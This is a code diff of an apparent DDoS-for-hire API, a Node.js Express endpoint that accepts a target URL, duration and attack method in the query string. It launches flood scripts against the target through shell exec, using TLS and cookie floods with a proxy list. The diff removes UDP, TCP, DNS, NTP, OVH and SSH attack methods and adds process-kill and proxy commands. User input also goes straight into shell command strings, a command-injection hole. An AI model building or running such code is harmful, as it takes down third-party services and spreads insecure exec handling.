@@ -14,9 +14,7 @@ async function fetchData() {
 }
 
 app.get('/permen', (req, res) => {
-  const { target, time, methods, port } = req.query;
-  const sikat = new url.URL(target);
-  const slurp = sikat.hostname;
+  const { target, time, methods } = req.query;
 
   res.status(200).json({
     message: 'API request received. Executing script shortly.',
@@ -71,20 +69,10 @@ app.get('/permen', (req, res) => {
     exec(`node methods/cookie.js ${target} ${time} 4 65 proxy.txt`);
   } else if (methods === 'tls-slow') {
     exec(`node methods/YAT-TLS.js ${target} ${time} 65 4 proxy.txt`);
-  } else if (methods === 'udp') {
-    exec(`node methods/udp.js ${slurp} ${port} ${duration}`);
-  } else if (methods === 'kill-ssh') {
-    exec(`node methods/StarsXSSH.js ${slurp} 22 root ${duration}`);
-  } else if (methods === 'tcp') {
-    exec(`node methods/tcp.js ${slurp} ${port} ${duration}`);
-  } else if (methods === 'dns') {
-    exec(`node methods/dns.js ${slurp} ${port} ${duration}`);
-  } else if (methods === 'ntp') {
-    exec(`node methods/ntp.js ${slurp} ${port} ${duration}`);
-  } else if (methods === 'ovh') {
-    exec(`node methods/ovh.js ${slurp} ${port} ${duration}`);
-  } else if (methods === 'spampair') {
-    exec(`node lib/spampair.js ${target} ${duration}`);
+  } else if (methods === 'refresh') {
+    exec(`pm2 restart all && pkill node`);
+  } else if (methods === 'proxy') {
+    exec(`node proxy.js`);
   } else {
     console.log('Metode tidak dikenali atau format salah.');
   }
